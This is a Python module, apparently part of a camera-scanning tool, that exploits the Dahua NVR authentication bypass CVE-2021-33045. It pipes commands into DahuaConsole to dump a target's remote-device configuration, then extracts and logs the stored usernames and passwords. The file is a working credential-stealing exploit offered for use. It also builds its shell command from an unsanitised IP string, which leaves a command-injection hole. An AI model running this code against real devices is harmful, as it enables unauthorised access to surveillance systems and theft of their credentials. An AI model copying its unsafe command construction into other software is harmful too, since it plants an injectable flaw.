"""dahua(NVR) bypassing authentication vulnerability
some functions need the 'DahuaConsole', reference:
https://github.com/mcw0/DahuaConsole
"""
import os
import json

from Ingram.utils import config
from Ingram.utils import logger


def cve_2021_33045(ip: str) -> list:
    if ':' in ip: ip, port = ip.split(':')
    else: port = 80
    CWD = os.path.dirname(os.path.abspath(__file__))
    OUT = config['OUT']
    console = os.path.join(CWD, 'lib/DahuaConsole/Console.py')
    json_file = os.path.join(OUT, f"{ip}-{port}-users.json")

    try:
        with os.popen(f"""
        (
            echo "config RemoteDevice save {json_file}"
            echo "quit all"
        ) | python3 -Bu {console} --logon loopback --rhost {ip} --rport {port} --proto dhip 2>/dev/null
        """) as f: items = f.readlines()

        # success
        if os.path.exists(json_file):
            with open(json_file, 'r') as f:
                info = json.load(f)
            dev_all = info['params']['table'].values()
            dev_alive = [i for i in dev_all if i['Enable']]
            user = dev_alive[0]['UserName']
            passwd = dev_alive[0]['Password']
            os.remove(json_file)
            logger.info(f"{ip} found cve-2021-33045 (user: {user}, passwd: {passwd})")
            return [True, user, passwd, 'cve-2021-33045', len(dev_alive)]
    except Exception as e:
        logger.error(e)
    return [False, ]